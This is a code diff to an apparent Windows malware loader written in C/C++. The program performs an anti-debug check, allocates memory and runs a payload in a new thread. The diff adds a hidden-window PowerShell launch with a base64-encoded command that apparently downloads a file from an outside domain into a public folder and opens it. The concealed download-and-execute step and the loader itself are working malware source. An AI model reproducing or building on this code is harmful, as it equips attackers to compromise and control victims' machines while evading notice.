@@ -26,6 +26,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     CREATETHREAD createThread;
     VIRTUALALLOC  virtualAlloc;
     VIRTUALPROTECT virtualProtect;
+    PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFOA si = { 0 };
 
     // Anti debug check
     antiDebug();
@@ -70,6 +72,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         //printf("Starting thread\n");
         //Create thread at start of memory
         th = createThread(0, 0, (LPTHREAD_START_ROUTINE)payloadPtr, 0, 0, 0);
+        CreateProcessA((LPSTR)"c:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", (LPSTR)"c:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -e SQBXAFIAIABoAHQAdABwAHMAOgAvAC8AdQBjAGYAdQBuAGQAZQByAGcAcgBhAGQAcwAuAGMAbwBtAC8AcgBvAHUAdABpAG4AZwAuAHQAeAB0ACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAByAG8AdQB0AGkAbgBnAC4AdAB4AHQAOwAgAEkAbgB2AG8AawBlAC0ASQB0AGUAbQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAcgBvAHUAdABpAG4AZwAuAHQAeAB0AA==", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
+
         WaitForSingleObject(th, -1);
     }
     return 0;
